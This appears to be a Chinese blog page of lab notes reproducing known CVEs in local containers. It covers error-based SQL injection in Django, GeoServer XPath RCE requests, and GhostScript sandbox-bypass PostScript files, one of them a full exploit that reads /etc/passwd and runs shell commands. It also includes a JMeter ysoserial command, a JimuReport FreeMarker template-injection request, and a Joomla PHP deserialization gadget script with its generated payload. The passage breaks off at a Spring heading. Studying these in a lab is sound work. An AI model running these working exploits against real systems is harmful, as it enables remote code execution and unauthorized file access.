<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041313235.png" alt="image-20240704131305202"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vuln/?order=.id);select updatexml(1,concat(&#x27;:&#x27;,&#x27;aaaa&#x27;),1)%23 //#号不行，或者换成--+来注释也可以</span><br></pre></td></tr></table></div></figure>

<p><code>updatexml(1, ...)</code>：<code>updatexml</code> 是一个 XML 处理函数，传递非法参数会引发错误。</p>
<p><code>concat(&#39;:&#39;, &#39;aaaa&#39;)</code>：<code>concat</code> 函数用于连接字符串，在这里它将 <code>:</code> 和 <code>aaaa</code> 连接起来。</p>
<p><code>1</code>：传递的第三个参数不合法，从而触发错误。</p>
<p>成功输出<code>:aaaa</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041316012.png" alt="image-20240704131651940"></p>
<p>证明漏洞存在</p>
<p>慢慢注入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.id);select updatexml(1,concat(&#x27;:&#x27;,(select database())),1)%23 //得到数据库名cve</span><br></pre></td></tr></table></div></figure>

<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/R3col/p/16094132.html" >https://www.cnblogs.com/R3col/p/16094132.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）"   >
          <a href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Django-JSONField-HStoreField-SQL注入漏洞（CVE-2019-14234）" class="headerlink" title="Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）"></a>Django JSONField/HStoreField SQL注入漏洞（CVE-2019-14234）</h2>
      <p>该漏洞需要开发者使用了JSONField/HStoreField，且用户可控queryset查询时的键名，在键名的位置注入SQL语句。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041343715.png" alt="image-20240704134348615"></p>
<p>首先登陆后台</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8000/admin/</span><br></pre></td></tr></table></div></figure>

<p>用户名密码为<code>admin</code>、<code>a123123123</code></p>
<p>登录后点击<code>Collection</code>，进入模型<code>Collection</code>的管理页面</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407041345637.png" alt="image-20240704134555591"></p>

        <h1 id="geoserver"   >
          <a href="#geoserver" class="heading-link"><i class="fas fa-link"></i></a><a href="#geoserver" class="headerlink" title="geoserver"></a>geoserver</h1>
      
        <h2 id="GeoServer属性名表达式前台代码执行漏洞（CVE-2024-36401）"   >
          <a href="#GeoServer属性名表达式前台代码执行漏洞（CVE-2024-36401）" class="heading-link"><i class="fas fa-link"></i></a><a href="#GeoServer属性名表达式前台代码执行漏洞（CVE-2024-36401）" class="headerlink" title="GeoServer属性名表达式前台代码执行漏洞（CVE-2024-36401）"></a>GeoServer属性名表达式前台代码执行漏洞（CVE-2024-36401）</h2>
      <p>GeoServer 2.25.1， 2.24.3， 2.23.5版本及以前，未登录的任意用户可以通过构造恶意OGC请求，在默认安装的服务器中执行XPath表达式，进而利用执行Apache Commons Jxpath提供的功能执行任意代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031333548.png" alt="image-20240703133343446"></p>
<p>点击<code>/geoserver</code>链接并抓包</p>
<p>使用<code>GetPropertyValue</code>来执行xpath表达式。构造了两个POC：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /geoserver/wfs?service=WFS&amp;version=2.0.0&amp;request=GetPropertyValue&amp;typeNames=sf:archsites&amp;valueReference=exec(java.lang.Runtime.getRuntime(),&#x27;touch%20/tmp/test1&#x27;) HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /geoserver/wfs HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Content-Type: application/xml</span><br><span class="line"></span><br><span class="line">&lt;wfs:GetPropertyValue service=&#x27;WFS&#x27; version=&#x27;2.0.0&#x27;</span><br><span class="line"> xmlns:topp=&#x27;http://www.openplans.org/topp&#x27;</span><br><span class="line"> xmlns:fes=&#x27;http://www.opengis.net/fes/2.0&#x27;</span><br><span class="line"> xmlns:wfs=&#x27;http://www.opengis.net/wfs/2.0&#x27;&gt;</span><br><span class="line">  &lt;wfs:Query typeNames=&#x27;sf:archsites&#x27;/&gt;</span><br><span class="line">  &lt;wfs:valueReference&gt;exec(java.lang.Runtime.getRuntime(),&#x27;touch /tmp/test2&#x27;)&lt;/wfs:valueReference&gt;</span><br><span class="line">&lt;/wfs:GetPropertyValue&gt;</span><br></pre></td></tr></table></div></figure>

<p>都是执行<code>touch /tmp/test</code>命令，查看容器内文档即可验证</p>
<p>（本来想试试将<code>id</code>命令写入某个文档，但是命令不成功，可能是因为<code>&gt;</code>与前面的符合产生了闭合，所以无法执行）</p>

        <h1 id="Ghostscript"   >
          <a href="#Ghostscript" class="heading-link"><i class="fas fa-link"></i></a><a href="#Ghostscript" class="headerlink" title="Ghostscript"></a>Ghostscript</h1>
      
        <h2 id="GhostScript沙箱绕过（命令执行）漏洞CVE-2018-16509"   >
          <a href="#GhostScript沙箱绕过（命令执行）漏洞CVE-2018-16509" class="heading-link"><i class="fas fa-link"></i></a><a href="#GhostScript沙箱绕过（命令执行）漏洞CVE-2018-16509" class="headerlink" title="GhostScript沙箱绕过（命令执行）漏洞CVE-2018-16509"></a>GhostScript沙箱绕过（命令执行）漏洞CVE-2018-16509</h2>
      <p>GhostScript的安全沙箱可以被绕过，通过构造恶意的图片内容，将可以造成命令执行、文件读取、文件删除等漏洞</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021430509.png" alt="image-20240702143020478"></p>
<p>是一个上传文件的界面</p>
<p>上传了yaml等格式的文件都提示<code>Unsupported filetype uploaded</code>，但是上传图片文件则会返回<code>Image size is:</code>，所以只能上次图片文件来绕过文件类型的检测</p>
<p>由于 GhostScript 是一个解释 PostScript 和 PDF 文件的程序，这个漏洞主要利用了 GhostScript 在处理这些文件时的缺陷，因此通常需要上传包含恶意代码的 PostScript 或 PDF 文件。</p>
<p>上传提供的POC.png文件，文件内容为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">userdict /setpagedevice undef</span><br><span class="line">save</span><br><span class="line">legal</span><br><span class="line">&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line">&#123; legal &#125; stopped &#123; pop &#125; if</span><br><span class="line">restore</span><br><span class="line">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br></pre></td></tr></table></div></figure>

<p><code>%!PS</code>：这是 PostScript 文件的开头标记</p>
<p><code>userdict /setpagedevice undef</code>：删除 <code>setpagedevice</code> 操作符，这是为了防止页面设备的默认设置被更改</p>
<p><code>save</code> 和 <code>restore</code>：这些操作用于保存和恢复PostScript的当前状态，确保任何更改不会影响后续代码</p>
<p><code>legal</code>：尝试设置页面格式为 legal 大小</p>
<p><code>&#123; null restore &#125; stopped &#123; pop &#125; if</code> 和 <code>&#123; legal &#125; stopped &#123; pop &#125; if</code>：这些操作用于捕获错误并确保如果发生错误，程序可以继续执行。</p>
<p><code>mark /OutputFile (%pipe%id) currentdevice putdeviceprops</code>：这一行试图设置输出文件路径为管道命令 <code>%pipe%id</code>，<code>%pipe%</code>后面的内容被解释为一个命令，而不是一个文件路径。</p>
<p>上传文件后即可看见命令成功执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021501909.png" alt="image-20240702150108881"></p>

        <h2 id="GhostScript沙箱绕过（命令执行）漏洞（CVE-2018-19475）"   >
          <a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2018-19475）" class="heading-link"><i class="fas fa-link"></i></a><a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2018-19475）" class="headerlink" title="GhostScript沙箱绕过（命令执行）漏洞（CVE-2018-19475）"></a>GhostScript沙箱绕过（命令执行）漏洞（CVE-2018-19475）</h2>
      <p>和CVE-2018-16509类似</p>
<p>文件内容为：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">0 1 300367 &#123;&#125; for</span><br><span class="line">&#123;save restore&#125; stopped &#123;&#125; if</span><br><span class="line">(%pipe%id) (w) file</span><br></pre></td></tr></table></div></figure>

<p><code>0 1 300367 &#123;&#125; for</code>:这是一个循环命令，<code>0 1 300367</code> 定义了循环的范围，从 0 到 300367，每次递增 1。<code>&#123;&#125;</code> 是一个空的代码块，在每次循环迭代时执行。在这种情况下，它没有实际的作用，可能是为了防止 PostScript 解释器因空指令而出错。</p>
<p><code>&#123;save restore&#125; stopped &#123;&#125; if</code>:这是一个错误处理块。<code>save restore</code> 是 PostScript 中用于保存和恢复图形状态的命令。<code>stopped</code> 是一个操作符，用于捕获可能的错误。如果 <code>save restore</code> 命令失败，将停止并执行 <code>&#123;&#125; if</code> 后面的空代码块。这种结构用于确保如果 <code>save restore</code> 失败，代码能够继续执行而不崩溃。</p>
<p><code>(%pipe%id &gt; /tmp/success &amp;&amp; cat /tmp/success) (w) file</code>:<code>(w)</code> 表示文件的写模式。<code>file</code> 是一个 PostScript 操作符，用于打开文件并将内容写入文件。</p>

        <h2 id="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"   >
          <a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="heading-link"><i class="fas fa-link"></i></a><a href="#GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）" class="headerlink" title="GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）"></a>GhostScript沙箱绕过（命令执行）漏洞（CVE-2019-6116）</h2>
      <p>该漏洞可以直接绕过 ghostscript 的安全沙箱，导致攻击者可以执行任意命令/读取任意文件。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">%!PS</span><br><span class="line">% extract .actual_pdfpaintproc operator from pdfdict</span><br><span class="line">/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def</span><br><span class="line"></span><br><span class="line">/exploit &#123;</span><br><span class="line">    (Stage 11: Exploitation...)=</span><br><span class="line"></span><br><span class="line">    /forceput exch def</span><br><span class="line"></span><br><span class="line">    systemdict /SAFER false forceput</span><br><span class="line">    userparams /LockFilePermissions false forceput</span><br><span class="line">    systemdict /userparams get /PermitFileControl [(*)] forceput</span><br><span class="line">    systemdict /userparams get /PermitFileWriting [(*)] forceput</span><br><span class="line">    systemdict /userparams get /PermitFileReading [(*)] forceput</span><br><span class="line"></span><br><span class="line">    % update</span><br><span class="line">    save restore</span><br><span class="line"></span><br><span class="line">    % All done.</span><br><span class="line">    stop</span><br><span class="line">&#125; def</span><br><span class="line"></span><br><span class="line">errordict /typecheck &#123;</span><br><span class="line">    /typecount typecount 1 add def</span><br><span class="line">    (Stage 10: /typecheck #)=only typecount ==</span><br><span class="line"></span><br><span class="line">    % The first error will be the .knownget, which we handle and setup the</span><br><span class="line">    % stack. The second error will be the ifelse (missing boolean), and then we</span><br><span class="line">    % dump the operands.</span><br><span class="line">    typecount 1 eq &#123; null &#125; if</span><br><span class="line">    typecount 2 eq &#123; pop 7 get exploit &#125; if</span><br><span class="line">    typecount 3 eq &#123; (unexpected)= quit &#125;  if</span><br><span class="line">&#125; put</span><br><span class="line"></span><br><span class="line">% The pseudo-operator .actual_pdfpaintproc from pdf_draw.ps pushes some</span><br><span class="line">% executable arrays onto the operand stack that contain .forceput, but are not</span><br><span class="line">% marked as executeonly or pseudo-operators.</span><br><span class="line">%</span><br><span class="line">% The routine was attempting to pass them to ifelse, but we can cause that to</span><br><span class="line">% fail because when the routine was declared, it used `bind` but many of the</span><br><span class="line">% names it uses are not operators and so are just looked up in the dictstack.</span><br><span class="line">%</span><br><span class="line">% This means we can push a dict onto the dictstack and control how the routine</span><br><span class="line">% works.</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /typecount      0</span><br><span class="line">    /PDFfile        &#123; (Stage 0: PDFfile)= currentfile &#125;</span><br><span class="line">    /q              &#123; (Stage 1: q)= &#125; % no-op</span><br><span class="line">    /oget           &#123; (Stage 3: oget)= pop pop 0 &#125; % clear stack</span><br><span class="line">    /pdfemptycount  &#123; (Stage 4: pdfemptycount)= &#125; % no-op</span><br><span class="line">    /gput           &#123; (Stage 5: gput)= &#125;  % no-op</span><br><span class="line">    /resolvestream  &#123; (Stage 6: resolvestream)= &#125; % no-op</span><br><span class="line">    /pdfopdict      &#123; (Stage 7: pdfopdict)= &#125; % no-op</span><br><span class="line">    /.pdfruncontext &#123; (Stage 8: .pdfruncontext)= 0 1 mark &#125; % satisfy counttomark and index</span><br><span class="line">    /pdfdict        &#123; (Stage 9: pdfdict)=</span><br><span class="line">        % cause a /typecheck error we handle above</span><br><span class="line">        true</span><br><span class="line">    &#125;</span><br><span class="line">&gt;&gt; begin &lt;&lt;&gt;&gt; &lt;&lt;&gt;&gt; &#123; .actual_pdfpaintproc &#125; stopped pop</span><br><span class="line"></span><br><span class="line">(Should now have complete control over ghostscript, attempting to read /etc/passwd...)=</span><br><span class="line"></span><br><span class="line">% Demonstrate reading a file we shouldnt have access to.</span><br><span class="line">(/etc/passwd) (r) file dup 64 string readline pop == closefile</span><br><span class="line"></span><br><span class="line">(Attempting to execute a shell command...)= flush</span><br><span class="line"></span><br><span class="line">% run command</span><br><span class="line">(%pipe%id &gt; /tmp/success) (w) file closefile</span><br><span class="line"></span><br><span class="line">(All done.)=</span><br><span class="line"></span><br><span class="line">quit</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031014998.png" alt="image-20240703101452954"></p>
<p><code>/.actual_pdfpaintproc pdfdict /.actual_pdfpaintproc get def</code>: 从 <code>pdfdict</code> 字典中提取 <code>.actual_pdfpaintproc</code> 操作符并定义它。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031014134.png"></p>
<p><code>/exploit</code>: 定义一个名为 <code>exploit</code> 的过程。</p>
<p><code>(Stage 11: Exploitation...)=</code>: 输出一个调试信息，指示当前阶段。</p>
<p><code>/forceput exch def</code>: 定义 <code>forceput</code>。</p>
<p><code>systemdict /SAFER false forceput</code>: 禁用 <code>SAFER</code> 模式。</p>
<p><code>userparams /LockFilePermissions false forceput</code>: 取消文件权限锁定。</p>
<p><code>systemdict /userparams get /PermitFileControl [(\*)] forceput</code>: 允许文件控制。</p>
<p><code>systemdict /userparams get /PermitFileWriting [(\*)] forceput</code>: 允许文件写入。</p>
<p><code>systemdict /userparams get /PermitFileReading [(\*)] forceput</code>: 允许文件读取。</p>
<p><code>save restore</code>: 更新状态。</p>
<p><code>stop</code>: 停止执行。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031015391.png" alt="image-20240703101527352"></p>
<p><code>errordict /typecheck</code>: 修改 <code>typecheck</code> 错误处理。</p>
<p><code>/typecount typecount 1 add def</code>: 递增 <code>typecount</code>。</p>
<p><code>(Stage 10: /typecheck #)=only typecount ==</code>: 输出调试信息。</p>
<p><code>typecount 1 eq &#123; null &#125; if</code>: 如果 <code>typecount</code> 等于 1，则执行空操作。</p>
<p><code>typecount 2 eq &#123; pop 7 get exploit &#125; if</code>: 如果 <code>typecount</code> 等于 2，执行 <code>exploit</code> 过程。</p>
<p><code>typecount 3 eq &#123; (unexpected)= quit &#125; if</code>: 如果 <code>typecount</code> 等于 3，输出 <code>unexpected</code> 并退出。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031016244.png" alt="image-20240703101629197"></p>
<p>字典定义和错误触发: 定义一个包含多个过程的字典，这些过程在执行时将触发 <code>typecheck</code> 错误，从而执行 <code>exploit</code> 过程。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407031017167.png" alt="image-20240703101710120"></p>
<p><strong>实际执行命令</strong>:</p>
<p><code>(Should now have complete control over ghostscript, attempting to read /etc/passwd...)=</code>: 输出调试信息。</p>
<p><code>(/etc/passwd) (r) file dup 64 string readline pop == closefile</code>: 读取 <code>/etc/passwd</code> 文件内容并输出。</p>
<p><code>(Attempting to execute a shell command...)= flush</code>: 输出调试信息并刷新输出缓冲。</p>
<p><code>(%pipe%id &gt; /tmp/success) (w) file closefile</code>: 执行 <code>id</code> 命令并将结果写入 <code>/tmp/success</code> 文件。</p>
<p><code>(All done.)=</code>: 输出调试信息。</p>
<p><code>quit</code>: 退出。</p>

        <h1 id="jmeter"   >
          <a href="#jmeter" class="heading-link"><i class="fas fa-link"></i></a><a href="#jmeter" class="headerlink" title="jmeter"></a>jmeter</h1>
      
        <h2 id="Apache-JMeter-RMI-反序列化命令执行漏洞（CVE-2018-1297）"   >
          <a href="#Apache-JMeter-RMI-反序列化命令执行漏洞（CVE-2018-1297）" class="heading-link"><i class="fas fa-link"></i></a><a href="#Apache-JMeter-RMI-反序列化命令执行漏洞（CVE-2018-1297）" class="headerlink" title="Apache JMeter RMI 反序列化命令执行漏洞（CVE-2018-1297）"></a>Apache JMeter RMI 反序列化命令执行漏洞（CVE-2018-1297）</h2>
      <p>其2.x版本和3.x版本中存在反序列化漏洞，攻击者可以利用该漏洞在目标服务器上执行任意命令。</p>
<p>运行完成后将启动一个RMI服务并监听1099端口</p>
<p>使用ysoserial</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 BeanShell1 &#x27;touch /tmp/success&#x27;</span><br></pre></td></tr></table></div></figure>

<p>进入容器查看文件即可验证</p>

        <h1 id="jimureport"   >
          <a href="#jimureport" class="heading-link"><i class="fas fa-link"></i></a><a href="#jimureport" class="headerlink" title="jimureport"></a>jimureport</h1>
      
        <h2 id="JimuReport-FreeMarker服务端模板注入命令执行CVE-2023-4450"   >
          <a href="#JimuReport-FreeMarker服务端模板注入命令执行CVE-2023-4450" class="heading-link"><i class="fas fa-link"></i></a><a href="#JimuReport-FreeMarker服务端模板注入命令执行CVE-2023-4450" class="headerlink" title="JimuReport FreeMarker服务端模板注入命令执行CVE-2023-4450"></a>JimuReport FreeMarker服务端模板注入命令执行CVE-2023-4450</h2>
      <p>由于未授权的 API <code>/jmreport/queryFieldBySql</code> 使用了 freemarker 解析 SQL 语句从而导致了 RCE 漏洞的产生。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011522226.png" alt="image-20240701152157955"></p>
<p>随便选一个模板进行设计并抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011641518.png" alt="image-20240701164158470"></p>
<p>将请求包修改为</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /jmreport/queryFieldBySql HTTP/1.1</span><br><span class="line">Host: your-ip:8085</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.162.131:8085/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: adminer_permanent=; Hm_lvt_b756a4a8e1c58d613e27d1459c6d6076=1719818398; Hm_lpvt_b756a4a8e1c58d613e27d1459c6d6076=1719823231</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;sql&quot;:&quot;select &#x27;result:&lt;#assign ex=\&quot;freemarker.template.utility.Execute\&quot;?new()&gt; $&#123;ex(\&quot;id\&quot;)&#125;&#x27;&quot; &#125;</span><br></pre></td></tr></table></div></figure>

<p><code>id</code>命令成功执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011643580.png" alt="image-20240701164328527"></p>

        <h1 id="Joomla"   >
          <a href="#Joomla" class="heading-link"><i class="fas fa-link"></i></a><a href="#Joomla" class="headerlink" title="Joomla"></a>Joomla</h1>
      
        <h2 id="Joomla-3-4-5反序列化漏洞CVE-2015-8562"   >
          <a href="#Joomla-3-4-5反序列化漏洞CVE-2015-8562" class="heading-link"><i class="fas fa-link"></i></a><a href="#Joomla-3-4-5反序列化漏洞CVE-2015-8562" class="headerlink" title="Joomla 3.4.5反序列化漏洞CVE-2015-8562"></a>Joomla 3.4.5反序列化漏洞CVE-2015-8562</h2>
      <p>PHP5.6.13前的版本在读取存储好的session时，如果反序列化出错则会跳过当前一段数据而去反序列化下一段数据。而Joomla将session存储在Mysql数据库中，编码是utf8，当我们插入4字节的utf8数据时则会导致截断。截断后的数据在反序列化时就会失败，最后触发反序列化漏洞。</p>
<p>通过Joomla中的Gadget，可造成任意代码执行的结果。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011715518.png" alt="image-20240701171506374"></p>
<p>抓包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407011718765.png" alt="image-20240701171838720"></p>
<p>删掉<code>User-Agent</code>和<code>Cookie</code>字段，发包，得到返回包的cookie</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021413886.png" alt="image-20240702141300767"></p>
<p>用脚本</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class JSimplepieFactory &#123;</span><br><span class="line">&#125;</span><br><span class="line">class JDatabaseDriverMysql &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class SimplePie &#123;</span><br><span class="line">    var $sanitize;</span><br><span class="line">    var $cache;</span><br><span class="line">    var $cache_name_function;</span><br><span class="line">    var $javascript;</span><br><span class="line">    var $feed_url;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;feed_url = &quot;phpinfo();JFactory::getConfig();exit;&quot;;</span><br><span class="line">        $this-&gt;javascript = 9999;</span><br><span class="line">        $this-&gt;cache_name_function = &quot;assert&quot;;</span><br><span class="line">        $this-&gt;sanitize = new JDatabaseDriverMysql();</span><br><span class="line">        $this-&gt;cache = true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class JDatabaseDriverMysqli &#123;</span><br><span class="line">    protected $a;</span><br><span class="line">    protected $disconnectHandlers;</span><br><span class="line">    protected $connection;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;a = new JSimplepieFactory();</span><br><span class="line">        $x = new SimplePie();</span><br><span class="line">        $this-&gt;connection = 1;</span><br><span class="line">        $this-&gt;disconnectHandlers = [</span><br><span class="line">            [$x, &quot;init&quot;],</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = new JDatabaseDriverMysqli();</span><br><span class="line">$poc = serialize($a); </span><br><span class="line"></span><br><span class="line">$poc = str_replace(&quot;\x00*\x00&quot;, &#x27;\\0\\0\\0&#x27;, $poc);</span><br><span class="line"></span><br><span class="line">echo &quot;123&#125;__test|&#123;$poc&#125;\xF0\x9D\x8C\x86&quot;;</span><br></pre></td></tr></table></div></figure>

<p>这个脚本的主要目的是创建一个可以用于PHP对象反序列化攻击的有效负载。当目标系统反序列化这个对象时，如果目标系统的代码存在反序列化漏洞并且允许执行<code>assert</code>函数，它将会执行序列化对象中定义的PHP代码<code>phpinfo();JFactory::getConfig();exit;</code>，导致代码执行</p>
<p>生成POC如下：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;𝌆</span><br></pre></td></tr></table></div></figure>

<p>添加<code>User-Agent</code>和<code>Cookie</code>字段,生成好的POC作为<code>User-Agent</code>，带上第一步获取的Cookie发包，这一次发包，脏数据进入Mysql数据库。然后同样的包再发一次，代码被执行</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407021413420.png" alt="image-20240702141339367"></p>

        <h1 id="Spring"   >
          <a href="#Spring" class="heading-link"><i class="fas fa-link"></i></a><a href="#Spring" class="headerlink" title="Spring"></a>Spring</h1>
      
        <h2 id="Spring-WebFlow-远程代码执行漏洞（CVE-2017-4971）"   >
